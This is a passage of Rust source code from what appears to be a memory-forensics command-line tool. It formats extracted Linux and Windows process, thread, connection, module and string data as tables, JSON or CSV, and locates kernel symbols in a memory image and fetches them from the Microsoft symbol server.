    let yr = if month <= 2 { yr + 1 } else { yr };
    (yr, month, day)
}

/// FILETIME epoch is 1601-01-01. Unix epoch is 1970-01-01.
/// Difference: 11644473600 seconds = 116444736000000000 in 100ns ticks.
const FILETIME_UNIX_DIFF: u64 = 116_444_736_000_000_000;

/// Convert a Windows FILETIME (100-nanosecond intervals since 1601-01-01)
/// to "YYYY-MM-DD HH:MM:SS UTC". Returns "-" for zero (unset).
fn format_filetime(ft: u64) -> String {
    if ft == 0 {
        return "-".to_string();
    }
    if ft < FILETIME_UNIX_DIFF {
        // Pre-Unix-epoch date; rare in forensics but handle gracefully.
        return format!("pre-1970 ({ft:#x})");
    }
    let unix_secs = (ft - FILETIME_UNIX_DIFF) / 10_000_000;
    format_epoch(i64::try_from(unix_secs).unwrap_or(i64::MAX))
}

/// Format nanoseconds-since-boot into a human-readable uptime string.
fn format_boot_ns(ns: u64) -> String {
    if ns == 0 {
        return "0.000s".to_string();
    }
    let secs = ns / 1_000_000_000;
    let ms = (ns % 1_000_000_000) / 1_000_000;
    if secs < 60 {
        return format!("{secs}.{ms:03}s");
    }
    let mins = secs / 60;
    let s = secs % 60;
    if mins < 60 {
        return format!("{mins}m{s:02}s");
    }
    let hours = mins / 60;
    let m = mins % 60;
    if hours < 24 {
        return format!("{hours}h{m:02}m{s:02}s");
    }
    let days = hours / 24;
    let h = hours % 24;
    format!("{days}d{h:02}h{m:02}m")
}

fn print_linux_processes_table(
    procs: &[memf_linux::ProcessInfo],
    boot_info: &memf_linux::BootTimeInfo,
) {
    let has_boot = boot_info.best_estimate.is_some();
    let mut table = Table::new();
    table.load_preset(UTF8_FULL_CONDENSED);
    if has_boot {
        table.set_header(vec![
            "PID",
            "PPID",
            "Name",
            "State",
            "Start",
            "Start (UTC)",
            "Vaddr",
        ]);
    } else {
        table.set_header(vec!["PID", "PPID", "Name", "State", "Start", "Vaddr"]);
    }
    for p in procs {
        if has_boot {
            let abs = boot_info
                .absolute_secs(p.start_time)
                .map(format_epoch)
                .unwrap_or_default();
            table.add_row(vec![
                format!("{}", p.pid),
                format!("{}", p.ppid),
                p.comm.clone(),
                format!("{}", p.state),
                format_boot_ns(p.start_time),
                abs,
                format!("{:#x}", p.vaddr),
            ]);
        } else {
            table.add_row(vec![
                format!("{}", p.pid),
                format!("{}", p.ppid),
                p.comm.clone(),
                format!("{}", p.state),
                format_boot_ns(p.start_time),
                format!("{:#x}", p.vaddr),
            ]);
        }
    }
    println!("{table}");
    println!("\nTotal: {} processes", procs.len());
}

fn print_linux_processes_json(
    procs: &[memf_linux::ProcessInfo],
    boot_info: &memf_linux::BootTimeInfo,
) {
    for p in procs {
        let abs_epoch = boot_info.absolute_secs(p.start_time);
        let mut json = serde_json::json!({
            "pid": p.pid,
            "ppid": p.ppid,
            "name": p.comm,
            "state": format!("{}", p.state),
            "start_time_ns": p.start_time,
            "start_time": format_boot_ns(p.start_time),
            "vaddr": format!("{:#x}", p.vaddr),
        });
        if let Some(epoch) = abs_epoch {
            json["start_epoch"] = serde_json::json!(epoch);
            json["start_utc"] = serde_json::json!(format_epoch(epoch));
        }
        println!("{}", serde_json::to_string(&json).unwrap_or_default());
    }
}

fn print_linux_processes_csv(
    procs: &[memf_linux::ProcessInfo],
    boot_info: &memf_linux::BootTimeInfo,
) {
    let has_boot = boot_info.best_estimate.is_some();
    if has_boot {
        println!("pid,ppid,name,state,start_time_ns,start_time,start_epoch,start_utc,vaddr");
    } else {
        println!("pid,ppid,name,state,start_time_ns,start_time,vaddr");
    }
    for p in procs {
        if has_boot {
            let abs = boot_info.absolute_secs(p.start_time).unwrap_or(0);
            println!(
                "{},{},{},{},{},{},{},{},{:#x}",
                p.pid,
                p.ppid,
                p.comm,
                p.state,
                p.start_time,
                format_boot_ns(p.start_time),
                abs,
                format_epoch(abs),
                p.vaddr,
            );
        } else {
            println!(
                "{},{},{},{},{},{},{:#x}",
                p.pid,
                p.ppid,
                p.comm,
                p.state,
                p.start_time,
                format_boot_ns(p.start_time),
                p.vaddr,
            );
        }
    }
}

fn print_linux_processes(
    procs: &[memf_linux::ProcessInfo],
    output: OutputFormat,
    boot_info: &memf_linux::BootTimeInfo,
) {
    match output {
        OutputFormat::Table => print_linux_processes_table(procs, boot_info),
        OutputFormat::Json => print_linux_processes_json(procs, boot_info),
        OutputFormat::Csv => print_linux_processes_csv(procs, boot_info),
    }
}

// ---------------------------------------------------------------------------
// Output formatters — Linux threads
// ---------------------------------------------------------------------------

fn print_linux_threads(threads: &[memf_linux::ThreadInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["TID", "TGID", "State", "Comm"]);
            for t in threads {
                table.add_row(vec![
                    format!("{}", t.tid),
                    format!("{}", t.tgid),
                    format!("{}", t.state),
                    t.comm.clone(),
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} threads", threads.len());
        }
        OutputFormat::Json => {
            for t in threads {
                let json = serde_json::json!({
                    "tid": t.tid,
                    "tgid": t.tgid,
                    "state": format!("{}", t.state),
                    "comm": t.comm,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("tid,tgid,state,comm");
            for t in threads {
                println!("{},{},{},{}", t.tid, t.tgid, t.state, t.comm);
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — Linux process tree
// ---------------------------------------------------------------------------

fn print_linux_pstree(
    entries: &[memf_linux::PsTreeEntry],
    output: OutputFormat,
    boot_info: &memf_linux::BootTimeInfo,
) {
    let has_boot = boot_info.best_estimate.is_some();
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            if has_boot {
                table.set_header(vec!["PID", "PPID", "State", "Start (UTC)", "Comm"]);
            } else {
                table.set_header(vec!["PID", "PPID", "State", "Comm"]);
            }
            for e in entries {
                let indent = "  ".repeat(e.depth as usize);
                let name = format!("{}{}", indent, e.process.comm);
                if has_boot {
                    let abs = boot_info
                        .absolute_secs(e.process.start_time)
                        .map(format_epoch)
                        .unwrap_or_default();
                    table.add_row(vec![
                        format!("{}", e.process.pid),
                        format!("{}", e.process.ppid),
                        format!("{}", e.process.state),
                        abs,
                        name,
                    ]);
                } else {
                    table.add_row(vec![
                        format!("{}", e.process.pid),
                        format!("{}", e.process.ppid),
                        format!("{}", e.process.state),
                        name,
                    ]);
                }
            }
            println!("{table}");
            println!("\nTotal: {} processes", entries.len());
        }
        OutputFormat::Json => {
            for e in entries {
                let abs_epoch = boot_info.absolute_secs(e.process.start_time);
                let mut json = serde_json::json!({
                    "pid": e.process.pid,
                    "ppid": e.process.ppid,
                    "state": format!("{}", e.process.state),
                    "comm": e.process.comm,
                    "depth": e.depth,
                    "start_time_ns": e.process.start_time,
                });
                if let Some(epoch) = abs_epoch {
                    json["start_epoch"] = serde_json::json!(epoch);
                    json["start_utc"] = serde_json::json!(format_epoch(epoch));
                }
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            if has_boot {
                println!("pid,ppid,state,comm,depth,start_time_ns,start_epoch,start_utc");
            } else {
                println!("pid,ppid,state,comm,depth");
            }
            for e in entries {
                if has_boot {
                    let abs = boot_info.absolute_secs(e.process.start_time).unwrap_or(0);
                    println!(
                        "{},{},{},{},{},{},{},{}",
                        e.process.pid,
                        e.process.ppid,
                        e.process.state,
                        e.process.comm,
                        e.depth,
                        e.process.start_time,
                        abs,
                        format_epoch(abs),
                    );
                } else {
                    println!(
                        "{},{},{},{},{}",
                        e.process.pid, e.process.ppid, e.process.state, e.process.comm, e.depth
                    );
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — Linux command lines
// ---------------------------------------------------------------------------

fn print_linux_cmdlines(cmdlines: &[memf_linux::CmdlineInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["PID", "Comm", "Command Line"]);
            for c in cmdlines {
                table.add_row(vec![
                    format!("{}", c.pid),
                    c.comm.clone(),
                    c.cmdline.clone(),
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} processes with command lines", cmdlines.len());
        }
        OutputFormat::Json => {
            for c in cmdlines {
                let json = serde_json::json!({
                    "pid": c.pid,
                    "comm": c.comm,
                    "cmdline": c.cmdline,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,comm,cmdline");
            for c in cmdlines {
                println!("{},{},{}", c.pid, c.comm, c.cmdline);
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — Windows processes
// ---------------------------------------------------------------------------

fn print_windows_processes(procs: &[memf_windows::WinProcessInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec![
                "PID",
                "PPID",
                "Image Name",
                "Create Time (UTC)",
                "CR3",
            ]);
            for p in procs {
                table.add_row(vec![
                    format!("{}", p.pid),
                    format!("{}", p.ppid),
                    p.image_name.clone(),
                    format_filetime(p.create_time),
                    format!("{:#x}", p.cr3),
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} processes", procs.len());
        }
        OutputFormat::Json => {
            for p in procs {
                let json = serde_json::json!({
                    "pid": p.pid,
                    "ppid": p.ppid,
                    "image_name": p.image_name,
                    "create_time": format_filetime(p.create_time),
                    "create_time_raw": p.create_time,
                    "cr3": format!("{:#x}", p.cr3),
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,ppid,image_name,create_time,create_time_raw,cr3");
            for p in procs {
                println!(
                    "{},{},{},{},{},{:#x}",
                    p.pid,
                    p.ppid,
                    p.image_name,
                    format_filetime(p.create_time),
                    p.create_time,
                    p.cr3
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — Linux modules
// ---------------------------------------------------------------------------

fn print_linux_modules(mods: &[memf_linux::ModuleInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["Name", "Base Address", "Size"]);
            for m in mods {
                table.add_row(vec![
                    m.name.clone(),
                    format!("{:#x}", m.base_addr),
                    format_size(m.size),
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} modules", mods.len());
        }
        OutputFormat::Json => {
            for m in mods {
                let json = serde_json::json!({
                    "name": m.name,
                    "base_addr": format!("{:#x}", m.base_addr),
                    "size": m.size,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("name,base_addr,size");
            for m in mods {
                println!("{},{:#x},{}", m.name, m.base_addr, m.size);
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — Windows drivers
// ---------------------------------------------------------------------------

fn print_windows_drivers(drivers: &[memf_windows::WinDriverInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["Name", "Base Address", "Size", "Path"]);
            for d in drivers {
                table.add_row(vec![
                    d.name.clone(),
                    format!("{:#x}", d.base_addr),
                    format_size(d.size),
                    d.full_path.clone(),
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} drivers", drivers.len());
        }
        OutputFormat::Json => {
            for d in drivers {
                let json = serde_json::json!({
                    "name": d.name,
                    "base_addr": format!("{:#x}", d.base_addr),
                    "size": d.size,
                    "path": d.full_path,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("name,base_addr,size,path");
            for d in drivers {
                let escaped = d.full_path.replace('"', "\"\"");
                println!("{},{:#x},{},\"{}\"", d.name, d.base_addr, d.size, escaped);
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — Windows command lines
// ---------------------------------------------------------------------------

fn print_windows_cmdlines(cmdlines: &[memf_windows::WinCmdlineInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["PID", "Image Name", "Command Line"]);
            for c in cmdlines {
                let cmdline_display = if c.cmdline.len() > 120 {
                    format!("{}...", &c.cmdline[..117])
                } else {
                    c.cmdline.clone()
                };
                table.add_row(vec![
                    format!("{}", c.pid),
                    c.image_name.clone(),
                    cmdline_display,
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} command lines", cmdlines.len());
        }
        OutputFormat::Json => {
            for c in cmdlines {
                let json = serde_json::json!({
                    "pid": c.pid,
                    "image_name": c.image_name,
                    "cmdline": c.cmdline,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,image_name,cmdline");
            for c in cmdlines {
                let escaped = c.cmdline.replace('"', "\"\"");
                println!("{},{},\"{}\"", c.pid, c.image_name, escaped);
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — Windows environment variables
// ---------------------------------------------------------------------------

fn print_windows_envvars(vars: &[memf_windows::WinEnvVarInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["PID", "Image Name", "Variable", "Value"]);
            for v in vars {
                table.add_row(vec![
                    format!("{}", v.pid),
                    v.image_name.clone(),
                    v.variable.clone(),
                    v.value.clone(),
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} environment variables", vars.len());
        }
        OutputFormat::Json => {
            for v in vars {
                let json = serde_json::json!({
                    "pid": v.pid,
                    "image_name": v.image_name,
                    "variable": v.variable,
                    "value": v.value,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,image_name,variable,value");
            for v in vars {
                let escaped_val = v.value.replace('"', "\"\"");
                println!(
                    "{},{},{},\"{}\"",
                    v.pid, v.image_name, v.variable, escaped_val
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — Windows process tree
// ---------------------------------------------------------------------------

fn print_pstree(entries: &[memf_windows::WinPsTreeEntry], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec![
                "PID",
                "PPID",
                "Image Name",
                "Create Time (UTC)",
                "CR3",
            ]);
            for e in entries {
                let indent = "  ".repeat(e.depth as usize);
                let name = format!("{}{}", indent, e.process.image_name);
                table.add_row(vec![
                    format!("{}", e.process.pid),
                    format!("{}", e.process.ppid),
                    name,
                    format_filetime(e.process.create_time),
                    format!("{:#x}", e.process.cr3),
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} processes", entries.len());
        }
        OutputFormat::Json => {
            for e in entries {
                let json = serde_json::json!({
                    "pid": e.process.pid,
                    "ppid": e.process.ppid,
                    "image_name": e.process.image_name,
                    "depth": e.depth,
                    "create_time": format_filetime(e.process.create_time),
                    "create_time_raw": e.process.create_time,
                    "cr3": format!("{:#x}", e.process.cr3),
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,ppid,image_name,depth,create_time,create_time_raw,cr3");
            for e in entries {
                println!(
                    "{},{},{},{},{},{},{:#x}",
                    e.process.pid,
                    e.process.ppid,
                    e.process.image_name,
                    e.depth,
                    format_filetime(e.process.create_time),
                    e.process.create_time,
                    e.process.cr3
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — PEB masquerade detection
// ---------------------------------------------------------------------------

fn print_masquerade(results: &[memf_windows::WinPebMasqueradeInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["PID", "EPROCESS Name", "PEB Image Path", "Suspicious"]);
            for r in results {
                table.add_row(vec![
                    format!("{}", r.pid),
                    r.eprocess_name.clone(),
                    r.peb_image_path.clone(),
                    if r.suspicious {
                        "YES".to_string()
                    } else {
                        "no".to_string()
                    },
                ]);
            }
            println!("{table}");
            let suspicious_count = results.iter().filter(|r| r.suspicious).count();
            println!(
                "\nTotal: {} processes checked, {} suspicious",
                results.len(),
                suspicious_count
            );
        }
        OutputFormat::Json => {
            for r in results {
                let json = serde_json::json!({
                    "pid": r.pid,
                    "eprocess_name": r.eprocess_name,
                    "peb_image_path": r.peb_image_path,
                    "suspicious": r.suspicious,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,eprocess_name,peb_image_path,suspicious");
            for r in results {
                let escaped = r.peb_image_path.replace('"', "\"\"");
                println!(
                    "{},{},\"{}\",{}",
                    r.pid, r.eprocess_name, escaped, r.suspicious
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — connections
// ---------------------------------------------------------------------------

fn print_connections(conns: &[memf_linux::ConnectionInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["Proto", "Local", "Remote", "State", "PID"]);
            for c in conns {
                let local = format!("{}:{}", c.local_addr, c.local_port);
                let remote = format!("{}:{}", c.remote_addr, c.remote_port);
                let pid_str = c.pid.map_or_else(|| "-".to_string(), |p| format!("{p}"));
                table.add_row(vec![
                    format!("{}", c.protocol),
                    local,
                    remote,
                    format!("{}", c.state),
                    pid_str,
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} connections", conns.len());
        }
        OutputFormat::Json => {
            for c in conns {
                let json = serde_json::json!({
                    "protocol": format!("{}", c.protocol),
                    "local_addr": c.local_addr,
                    "local_port": c.local_port,
                    "remote_addr": c.remote_addr,
                    "remote_port": c.remote_port,
                    "state": format!("{}", c.state),
                    "pid": c.pid,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("proto,local,remote,state,pid");
            for c in conns {
                let pid_str = c.pid.map_or_else(|| "-".to_string(), |p| format!("{p}"));
                println!(
                    "{},{}:{},{}:{},{},{}",
                    c.protocol,
                    c.local_addr,
                    c.local_port,
                    c.remote_addr,
                    c.remote_port,
                    c.state,
                    pid_str
                );
            }
        }
    }
}

fn print_win_connections(conns: &[memf_windows::WinConnectionInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec![
                "Proto", "Local", "Remote", "State", "PID", "Process", "Created",
            ]);
            for c in conns {
                let local = format!("{}:{}", c.local_addr, c.local_port);
                let remote = format!("{}:{}", c.remote_addr, c.remote_port);
                table.add_row(vec![
                    c.protocol.clone(),
                    local,
                    remote,
                    format!("{}", c.state),
                    format!("{}", c.pid),
                    c.process_name.clone(),
                    format_filetime(c.create_time),
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} connections", conns.len());
        }
        OutputFormat::Json => {
            for c in conns {
                let json = serde_json::json!({
                    "protocol": c.protocol,
                    "local_addr": c.local_addr,
                    "local_port": c.local_port,
                    "remote_addr": c.remote_addr,
                    "remote_port": c.remote_port,
                    "state": format!("{}", c.state),
                    "pid": c.pid,
                    "process_name": c.process_name,
                    "create_time": format_filetime(c.create_time),
                    "create_time_raw": c.create_time,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("proto,local,remote,state,pid,process,created,created_raw");
            for c in conns {
                println!(
                    "{},{}:{},{}:{},{},{},{},{},{}",
                    c.protocol,
                    c.local_addr,
                    c.local_port,
                    c.remote_addr,
                    c.remote_port,
                    c.state,
                    c.pid,
                    c.process_name,
                    format_filetime(c.create_time),
                    c.create_time,
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — threads
// ---------------------------------------------------------------------------

fn print_threads(threads: &[memf_windows::WinThreadInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec![
                "TID",
                "PID",
                "Start Address",
                "State",
                "Create Time (UTC)",
            ]);
            for t in threads {
                table.add_row(vec![
                    format!("{}", t.tid),
                    format!("{}", t.pid),
                    format!("{:#x}", t.start_address),
                    format!("{}", t.state),
                    format_filetime(t.create_time),
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} threads", threads.len());
        }
        OutputFormat::Json => {
            for t in threads {
                let json = serde_json::json!({
                    "tid": t.tid,
                    "pid": t.pid,
                    "start_address": format!("{:#x}", t.start_address),
                    "state": format!("{}", t.state),
                    "create_time": format_filetime(t.create_time),
                    "create_time_raw": t.create_time,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("tid,pid,start_address,state,create_time,create_time_raw");
            for t in threads {
                println!(
                    "{},{},{:#x},{},{},{}",
                    t.tid,
                    t.pid,
                    t.start_address,
                    t.state,
                    format_filetime(t.create_time),
                    t.create_time
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — libraries (DLLs, .so, dylibs)
// ---------------------------------------------------------------------------

fn print_libs(
    process_ctx: Option<(u64, &str)>,
    dlls: &[memf_windows::WinDllInfo],
    output: OutputFormat,
) {
    if let Some((pid, name)) = process_ctx {
        match output {
            OutputFormat::Table => println!("=== {name} (PID {pid}) ==="),
            OutputFormat::Json | OutputFormat::Csv => {}
        }
    }
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["Name", "Base Address", "Size", "Load Order", "Path"]);
            for d in dlls {
                table.add_row(vec![
                    d.name.clone(),
                    format!("{:#x}", d.base_addr),
                    format_size(d.size),
                    format!("{}", d.load_order),
                    d.full_path.clone(),
                ]);
            }
            println!("{table}");
            println!("Total: {} DLLs\n", dlls.len());
        }
        OutputFormat::Json => {
            for d in dlls {
                let mut json = serde_json::json!({
                    "name": d.name,
                    "base_addr": format!("{:#x}", d.base_addr),
                    "size": d.size,
                    "load_order": d.load_order,
                    "path": d.full_path,
                });
                if let Some((pid, name)) = process_ctx {
                    json["pid"] = serde_json::json!(pid);
                    json["image_name"] = serde_json::json!(name);
                }
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            if process_ctx.is_some() {
                println!("pid,image_name,name,base_addr,size,load_order,path");
            } else {
                println!("name,base_addr,size,load_order,path");
            }
            for d in dlls {
                let escaped = d.full_path.replace('"', "\"\"");
                if let Some((pid, name)) = process_ctx {
                    println!(
                        "{pid},{name},{},{:#x},{},{},\"{}\"",
                        d.name, d.base_addr, d.size, d.load_order, escaped
                    );
                } else {
                    println!(
                        "{},{:#x},{},{},\"{}\"",
                        d.name, d.base_addr, d.size, d.load_order, escaped
                    );
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Strings formatters (unchanged)
// ---------------------------------------------------------------------------

fn print_strings_table(strings: &[memf_strings::ClassifiedString]) {
    let mut table = Table::new();
    table.load_preset(UTF8_FULL_CONDENSED);
    table.set_header(vec!["Offset", "Encoding", "Categories", "Value"]);

    for s in strings {
        let cats: Vec<String> = s
            .categories
            .iter()
            .map(|(c, conf)| format!("{c:?}({:.0}%)", conf * 100.0))
            .collect();
        let cats_str = if cats.is_empty() {
            "-".to_string()
        } else {
            cats.join(", ")
        };

        let value_display = if s.value.len() > 80 {
            format!("{}...", &s.value[..77])
        } else {
            s.value.clone()
        };

        table.add_row(vec![
            format!("{:#010x}", s.physical_offset),
            format!("{:?}", s.encoding),
            cats_str,
            value_display,
        ]);
    }

    println!("{table}");
    println!(
        "\nTotal: {} strings ({} classified)",
        strings.len(),
        strings.iter().filter(|s| !s.categories.is_empty()).count()
    );
}

fn print_strings_json(strings: &[memf_strings::ClassifiedString]) -> Result<()> {
    for s in strings {
        let json = serde_json::json!({
            "offset": s.physical_offset,
            "encoding": format!("{:?}", s.encoding),
            "value": s.value,
            "categories": s.categories.iter().map(|(c, conf)| {
                serde_json::json!({"category": format!("{c:?}"), "confidence": conf})
            }).collect::<Vec<_>>(),
        });
        println!("{}", serde_json::to_string(&json)?);
    }
    Ok(())
}

fn print_strings_csv(strings: &[memf_strings::ClassifiedString]) {
    println!("offset,encoding,categories,value");
    for s in strings {
        let cats: Vec<String> = s.categories.iter().map(|(c, _)| format!("{c:?}")).collect();
        let escaped_value = s.value.replace('"', "\"\"");
        println!(
            "{:#010x},{:?},{},\"{}\"",
            s.physical_offset,
            s.encoding,
            cats.join(";"),
            escaped_value
        );
    }
}

// ---------------------------------------------------------------------------
// Kernel PDB scanning
// ---------------------------------------------------------------------------

/// Try to auto-download kernel symbols by scanning physical memory for a
/// Windows kernel PE, extracting PDB identification, and fetching from the
/// Microsoft symbol server.
fn try_auto_download_symbols(
    provider: &dyn PhysicalMemoryProvider,
) -> Result<Box<dyn memf_symbols::SymbolResolver>> {
    let pdb_id = find_kernel_pdb_in_physmem(provider)
        .context("no Windows kernel PE found in physical memory")?;

    eprintln!(
        "Found kernel PDB: {} (GUID {}, age {})",
        pdb_id.pdb_name, pdb_id.guid, pdb_id.age
    );
    eprintln!("Downloading from Microsoft symbol server...");

    let client = memf_symbols::symserver::SymbolServerClient::microsoft()
        .context("failed to initialize symbol server client")?;
    let pdb_path = client
        .get_pdb(&pdb_id.pdb_name, &pdb_id.guid, pdb_id.age)
        .with_context(|| format!("failed to download {}", pdb_id.pdb_name))?;

    eprintln!("Cached at {}", pdb_path.display());

    let resolver = memf_symbols::pdb_resolver::PdbResolver::from_path(&pdb_path)
        .with_context(|| format!("failed to load PDB from {}", pdb_path.display()))?;
    Ok(Box::new(resolver))
}

/// MZ magic bytes (PE header signature).
const MZ_MAGIC: [u8; 2] = [0x4D, 0x5A];

/// Maximum bytes to read when probing a PE candidate.
const PE_PROBE_SIZE: usize = 4096;

/// Known kernel PDB name prefixes.
const KERNEL_PDB_PREFIXES: &[&str] = &["ntkrnl", "ntoskrnl"];

/// Scan physical memory for a Windows kernel PE and extract its PDB identification.
///
/// Walks page-aligned offsets looking for MZ headers, parses each as a PE,
/// and returns the first PDB ID whose name matches `ntkrnl*` or `ntoskrnl*`.
fn find_kernel_pdb_in_physmem(
    provider: &dyn PhysicalMemoryProvider,
) -> Option<memf_symbols::pe_debug::PdbId> {
    let mut buf = vec![0u8; PE_PROBE_SIZE];

    for range in provider.ranges() {
        // Scan page-aligned offsets within this range.
        let start = (range.start + 0xFFF) & !0xFFF; // round up to page boundary
        let mut addr = start;
        while addr + 2 <= range.end {
            // Quick check: read MZ magic (2 bytes).
            let mut magic = [0u8; 2];
            if provider.read_phys(addr, &mut magic).ok() != Some(2) || magic != MZ_MAGIC {
                addr += 4096;
                continue;
            }

            // Read full page for PE parsing.
            let read_len = PE_PROBE_SIZE.min((range.end - addr) as usize);
            let n = provider.read_phys(addr, &mut buf[..read_len]).ok()?;
            if n < 256 {
                addr += 4096;
                continue;
            }

            // Try to extract PDB info from this PE candidate.
            if let Ok(pdb_id) = memf_symbols::pe_debug::extract_pdb_id(&buf[..n]) {
                let name_lower = pdb_id.pdb_name.to_lowercase();
                if KERNEL_PDB_PREFIXES
                    .iter()
                    .any(|prefix| name_lower.starts_with(prefix))
                {
                    return Some(pdb_id);
                }
            }

            addr += 4096;
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Output formatters — VMAs (maps)
// ---------------------------------------------------------------------------

fn print_vmas(vmas: &[memf_linux::VmaInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["PID", "Process", "Start", "End", "Flags", "File"]);
            for v in vmas {
                table.add_row(vec![
                    format!("{}", v.pid),
                    v.comm.clone(),
                    format!("{:#x}", v.start),
                    format!("{:#x}", v.end),
                    format!("{}", v.flags),
                    if v.file_backed { "yes" } else { "anon" }.to_string(),
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} VMAs", vmas.len());
        }
        OutputFormat::Json => {
            for v in vmas {
                let json = serde_json::json!({
                    "pid": v.pid,
                    "comm": v.comm,
                    "start": format!("{:#x}", v.start),
                    "end": format!("{:#x}", v.end),
                    "flags": format!("{}", v.flags),
                    "file_backed": v.file_backed,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,comm,start,end,flags,file_backed");
            for v in vmas {
                println!(
                    "{},{},{:#x},{:#x},{},{}",
                    v.pid, v.comm, v.start, v.end, v.flags, v.file_backed
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — file descriptors
// ---------------------------------------------------------------------------

fn print_file_descriptors(fds: &[memf_linux::FileDescriptorInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["PID", "Process", "FD", "Path", "Inode", "Pos"]);
            for f in fds {
                let inode_str = f.inode.map_or_else(|| "-".to_string(), |i| format!("{i}"));
                table.add_row(vec![
                    format!("{}", f.pid),
                    f.comm.clone(),
                    format!("{}", f.fd),
                    f.path.clone(),
                    inode_str,
                    format!("{}", f.pos),
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} file descriptors", fds.len());
        }
        OutputFormat::Json => {
            for f in fds {
                let json = serde_json::json!({
                    "pid": f.pid,
                    "comm": f.comm,
                    "fd": f.fd,
                    "path": f.path,
                    "inode": f.inode,
                    "pos": f.pos,
                });
